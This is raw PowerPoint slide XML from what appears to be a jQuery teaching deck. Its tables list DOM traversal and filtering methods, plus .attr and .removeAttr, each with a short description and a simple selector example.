                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2914632">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4857784">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3200384">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20002"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="336920">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>Method</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>Selects those which/returns/Description</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>Examples</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="579184">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.filter(selector)</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.filter(function)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>meet the filtering criteria</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>li</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>').filter(':even')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10001"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="579184">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.not(selector)</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.not(function)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0"/>
                        <a:t>do NOT meet the criteria (opposite of filter)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="4572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a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>li</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>').not (':even')</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10002"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="336920">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.contains(text)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0"/>
                        <a:t>contain the given text</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>li</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>').contains('my</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0"/>
                        <a:t> text')</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10003"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="336920">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>eq</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>(index)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0"/>
                        <a:t>match the index (begins from 0)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>li</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>').</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>eq</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>(2)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10004"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="335317">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.find(selector)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>match</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0"/>
                        <a:t> selector (descends down the tree)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('li.level2').find('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>li</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10005"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="336920">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.children([selector])</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>all children nodes</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('ul.level1').children()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10006"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="336920">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.parents([selector])</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>all</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0"/>
                        <a:t> parents (goes up the tree)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('span.info').parents()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10007"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="336920">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.parent([selector)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>parent node</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>li.myclass</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>').parent()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10008"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="336920">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.next([selector])</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>following sibling of each element</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('li.item3').next()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10009"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="336920">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>prev</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>([selector])</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>previous sibling of each element</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="4572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$('li.item3').</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>prev</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10010"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="336920">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.add(expression)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>adds elements to the</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0"/>
                        <a:t> set</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>li</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>').add('p')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="89320" marR="89320" marT="45725" marB="45725"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10011"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{13D86A49-88EE-4CB2-87EB-06E51858F63D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>jQuery DOM Manipulation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Sisällön paikkamerkki 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5FC4BBB4-88C2-4BC9-917D-94A218FDF70A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="456556319"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1417638"/>
          <a:ext cx="10972798" cy="5189544"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2518348">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4137283">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4317167">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20002"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="335253">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>Method</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>Description</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>Example</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="521360">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>attr</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>(attribute)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>get or set one or more attributes</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('#</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>greatphoto</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>').</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>attr</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>alt',</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0" err="1"/>
                        <a:t>'great</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0"/>
                        <a:t> photo')</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10001"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="335253">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>removeAttr</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>(name)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="4570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remove an attribute</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>img</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>').</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>removeAttr</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>('alt')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10002"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
